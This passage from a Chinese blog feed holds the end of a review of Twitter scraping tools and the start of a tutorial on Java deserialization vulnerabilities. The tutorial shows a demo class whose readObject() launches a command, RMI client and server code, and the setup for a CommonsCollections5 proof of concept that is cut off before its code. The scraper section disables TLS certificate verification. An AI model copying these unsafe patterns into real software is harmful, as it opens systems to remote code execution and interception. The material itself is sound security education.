href="https://github.com/Altimis/Scweet">Scweet</a></h2><p>支持关键词、标签、时间范围等搜索选项，也支持用户信息、关注、关注者的爬取。</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Scweet==1.6</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 用 selenium 模拟浏览器访问，竟然还不是 headless 模式，直接给我弹出一个窗口可还行。注意这里不是本地时间，是 UTC 时间；存储格式为 UTF-8。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Scweet.scweet <span class="keyword">import</span> scrape</span><br><span class="line"></span><br><span class="line">data = scrape(words=[<span class="string">&quot;nijisanji&quot;</span>], since=<span class="string">&quot;2020-01-01&quot;</span>, until=<span class="string">&quot;2021-01-01&quot;</span>, from_account=<span class="literal">None</span>,</span><br><span class="line">            interval=<span class="number">1</span>,</span><br><span class="line">            headless=<span class="literal">False</span>, display_type=<span class="string">&quot;Latest&quot;</span>, save_images=<span class="literal">False</span>, proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>, save_dir=<span class="string">&#x27;outputs&#x27;</span>,</span><br><span class="line">            resume=<span class="literal">False</span>, filter_replies=<span class="literal">True</span>, proximity=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p> 结果爬了 175 条数据</p> <img src="https://i.loli.net/2021/10/11/iO3AjzBJUMm8th4.png"></li><li><p>总结</p><p> 可以用！暂时没遇到什么问题，用它！</p></li></ol><h2 id="SearchTT"><a href="#SearchTT" class="headerlink" title="SearchTT"></a><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></h2><p>还写了一篇知乎文章：<a href="https://zhuanlan.zhihu.com/p/87931509">这可能是是中文网上关于Twitter信息检索爬虫最全的项目了</a></p><p>描述含糊、仓库不更新、甚至还曾出租 API（评论里看起来可能是），拉倒🙃。</p><h2 id="Twitter-Hashtag-crawler"><a href="#Twitter-Hashtag-crawler" class="headerlink" title="Twitter Hashtag crawler"></a><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></h2><p>根据标签（hashtag）搜索</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/amitupreti/Hands-on-WebScraping</span><br><span class="line"><span class="built_in">cd</span> Hands-on-WebScraping/project1_twitter_hashtag_crawler</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p> 报错</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Could not find a version that satisfies the requirement dateutil (from versions: none)</span><br><span class="line">ERROR: No matching distribution found <span class="keyword">for</span> dateutil</span><br></pre></td></tr></table></figure><p> 但是本地已经有了 dateutil</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install python-dateutil --upgrade</span><br><span class="line"><span class="comment"># Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="comment"># Requirement already satisfied: python-dateutil in c:\users\linki\desktop\t\lib\site-packages (2.8.2)</span></span><br><span class="line"><span class="comment"># Requirement already satisfied: six&gt;=1.5 in c:\users\linki\desktop\t\lib\site-packages (from python-dateutil) (1.16.0)</span></span><br></pre></td></tr></table></figure><p> 直接装个 scrapy 得了</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br><span class="line">pip install ipdb</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 没有给代理配置的入口，显然连不上</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl twittercrawler -a filename=myhashtags.csv -o mydata.csv</span><br></pre></td></tr></table></figure></li><li><p>总结</p><p> 能够自定义的配置项太少，而且仅针对标签搜索，跳过。</p></li></ol><h2 id="stweet"><a href="#stweet" class="headerlink" title="stweet"></a><a href="https://github.com/markowanga/stweet">stweet</a></h2><p>支持推特的高级搜索选项，同时支持推文和用户信息的爬取<del>，stweet&#x2F;docs&#x2F;notebooks&#x2F; 目录下有各种示例</del>。</p><ol><li><p>安装</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install stweet</span><br></pre></td></tr></table></figure></li><li><p>示例</p><p> 提供许多配置项，非常友好</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> arrow</span><br><span class="line"><span class="keyword">import</span> stweet <span class="keyword">as</span> st</span><br><span class="line"></span><br><span class="line">ProxyConfig = st.RequestsWebClientProxyConfig(</span><br><span class="line">    http_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>,</span><br><span class="line">    https_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">since = arrow.get(<span class="string">&#x27;2021-10-01&#x27;</span>)</span><br><span class="line">until = arrow.get(<span class="string">&#x27;2021-10-02&#x27;</span>)</span><br><span class="line"></span><br><span class="line">search_tweets_task = st.SearchTweetsTask(</span><br><span class="line">    exact_words=<span class="string">&quot;nijisanji&quot;</span>,</span><br><span class="line">    since=since,</span><br><span class="line">    until=until,</span><br><span class="line">    replies_filter=st.RepliesFilter.ONLY_ORIGINAL,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">st.TweetSearchRunner(</span><br><span class="line">    search_tweets_task=search_tweets_task,</span><br><span class="line">    tweet_outputs=[st.CsvTweetOutput(<span class="string">&#x27;nijisanji_20211001_20211002.csv&#x27;</span>), st.PrintTweetOutput()],</span><br><span class="line">    web_client=st.RequestsWebClient(proxy=ProxyConfig, verify=<span class="literal">False</span>),</span><br><span class="line">).run()</span><br></pre></td></tr></table></figure><p> 不碍事儿的警告</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host <span class="string">&#x27;127.0.0.1&#x27;</span>. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html<span class="comment">#ssl-warnings</span></span><br><span class="line">warnings.warn(</span><br></pre></td></tr></table></figure><p> 添加以下语句关闭</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure><p> 爬得非常快，字段也比 scweet 收集的多，但是只有 2021.10.02 的数据，难道时间范围是左开右闭的。多试几次发现爬太快了提示 <code>远程主机强迫关闭了一个现有的连接</code>，而且每次爬取的结果都不一样…</p> <img src="https://i.loli.net/2021/10/11/cXw9h8bOK1EAYjQ.png"></li><li><p>总结</p><p> 虽然能用但有点问题，作者正在准备 stweet 2.0，等推出之后再进行尝试。</p></li><li><p>更新</p><p> 2021.10.14 更新 stweet 2.0，说明文档还不够完善，如何使用的例子也没有。<br> 2021.10.15 测试了一下，可以爬取推文数据和用户数据否，但是现在只支持保存 JSON 格式的文件（因为没写解析），重复爬取了几次从文件大小上看都一样，所以应该没问题了。可以再等等完善。</p></li></ol><h2 id="Web-Scraping-Tweet-Traffic"><a href="#Web-Scraping-Tweet-Traffic" class="headerlink" title="Web_Scraping_Tweet_Traffic"></a><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></h2><p>配合文章食用：</p><ul><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-1-b3e2db29051d">Web Scrape Twitter by Python Selenium (Part 1)</a></li><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-2-c22ae3e78e03">Web Scrape Twitter by Python Selenium (Part 2)</a></li></ul><p>该仓库已于 2019 年停更，可作为爬取思路的学习材料。</p><h1 id="在线爬取"><a href="#在线爬取" class="headerlink" title="在线爬取"></a>在线爬取</h1><p><a href="https://www.vicinitas.io/free-tools/download-search-tweets">https://www.vicinitas.io/free-tools/download-search-tweets</a> ，需要推特账户登陆后爬取，可以一试。</p><img src="https://i.loli.net/2021/10/11/ckCoM9PsF18huad.jpg">]]></content>
    
    
    <summary type="html">挂代理爬取推文</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Java 反序列化漏洞入门</title>
    <link href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/"/>
    <id>https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/</id>
    <published>2021-09-16T03:41:30.000Z</published>
    <updated>2022-03-10T06:23:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-反序列化漏洞"><a href="#Java-反序列化漏洞" class="headerlink" title="Java 反序列化漏洞"></a>Java 反序列化漏洞</h1><div class="note info flat"><p>利用方法多、造成危害有大有小；没有效果很好的检测工具，通常是有经验的从业人员发现。</p></div><p>序列化：把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream 类的 <code>writeObject()</code> 方法可以实现序列化。</p><p>反序列化：把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 <code>readObject()</code> 方法用于反序列化。</p><p>漏洞成因：攻击者通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的恶意代码。</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="重写-readObject-方法"><a href="#重写-readObject-方法" class="headerlink" title="重写 readObject 方法"></a>重写 readObject 方法</h3><p>默认的序列化与反序列化操作，实现的效果就是写入文件和从文件中读取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 定义 obj 对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个包含对象进行序列化信息的 object 数据文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:/Study/test/object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() 方法将 obj 对象写入 object 文件</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从文件中反序列化 obj 对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:/Study/test/object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 恢复对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">obj2</span> <span class="operator">=</span> (String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看 object 文件中的内容（序列化的 obj）</p><ul><li><code>0xaced</code> 为 Java 对象序列化流的魔数，<code>0x0005</code> 为 Java 对象序列化的版本号，Java 对象序列化数据的前 4 个字节为 <code>AC ED 00 05</code></li></ul><img src="https://i.loli.net/2021/09/16/OD7GcKlSnPauLI4.png" ><p>重写 readObject 函数，在其中调用计算器</p><ul><li>只有实现 Serializable 接口的类的对象才可以被序列化</li><li>重写了 <code>readObject()</code> 函数</li><li>默认的写方法 <code>writeObject()</code> 可以将非静态和非 transient 的字段序列化<ul><li>简单的对象序列化操作用默认方法即可</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 定义 myObj 对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个包含对象进行反序列化信息的 myobject 数据文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:/Study/test/myobject&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() 方法将 myObj 对象写入 myobject 文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从文件中反序列化 obj 对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:/Study/test/myobject&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 恢复对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写 readObject() 方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 执行默认的 readObject() 方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行该程序，在控制台输出 <code>hi</code> 并弹出计算器</p><img src="https://i.loli.net/2021/09/16/wFJmiW5eLQcaOkv.jpg"><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI（Remote Method Invocation）：一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为 JRMP（Java Remote Message Protocol ，Java 远程消息交换协议）以及 CORBA。</p><img src="https://i.loli.net/2021/09/16/5uDiW4J7vPRMHAX.png" ><p>简单理解：服务器将提供的服务对象注册到注册表中，客户端查询注册表获得对象并调用</p><ol><li>服务端 Server.java 创建注册表，注册服务对象 <code>hello</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> service.impl.HelloImpl;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 生成存根（Stub）</span></span><br><span class="line">        UnicastRemoteObject.exportObject(hello,<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建本机 1099 端口上的 RMI registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对象绑定到注册表中</span></span><br><span class="line">        registry.rebind(name, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>远程接口定义及实现</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello.java</span></span><br><span class="line"><span class="keyword">package</span> service;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloImpl</span></span><br><span class="line"><span class="keyword">package</span> service.impl;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;quit&quot;</span>.equalsIgnoreCase(message.toString()))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Server will be shutdown!&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Message from client: &quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Server response:&quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>客户端 Client.java 调用远程对象</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 获取远程主机上的注册表</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取远程对象</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello)registry.lookup(name);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>( System.in ); <span class="comment">// 读取输入</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> sc.next();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 调用远程方法</span></span><br><span class="line">            hello.echo(message);</span><br><span class="line">            <span class="keyword">if</span>(message.equals(<span class="string">&quot;quit&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行 Server 提供 Hello 服务，运行 Client 查询 hello 远程服务对象，读取控制台运行并调用。</p><img src="https://i.loli.net/2021/09/16/eJc36u7bRKvmaSE.jpg" ><img src="https://i.loli.net/2021/09/16/cf2Qm6FZzPjOKax.jpg" ><h3 id="RMI-反序列化漏洞（CC5）"><a href="#RMI-反序列化漏洞（CC5）" class="headerlink" title="RMI 反序列化漏洞（CC5）"></a>RMI 反序列化漏洞（CC5）</h3><blockquote><p> 利用了 CommonsCollections5<br> jdk1.8 之后对 AnnotationInvocationHandler 类做了限制，所以在 jdk1.8 版本就拿 BadAttributeValueExpException 进行替代</p></blockquote><p>漏洞成因：RMI 在传输数据的时候，会将数据序列化，在传输完成后再进行反序列化；客户端提供构造好的恶意数据，服务器端接收后进行反序列化触发代码执行。</p><ul><li>能够进行 RMI 通信</li><li>服务器引用第三方存在反序列化漏洞的包</li></ul><p>结合 Apache Commons Collections 反序列化漏洞，构造 POC</p><ul><li>jdk 8u121以下（这里选择 8u111 复现）</li><li><a href="https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar">commons-collections-3.1.jar</a></li></ul><p>Server 和服务仍然使用上面的代码，修改 Client 的逻辑，构造能够触发代码执行的序列化对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 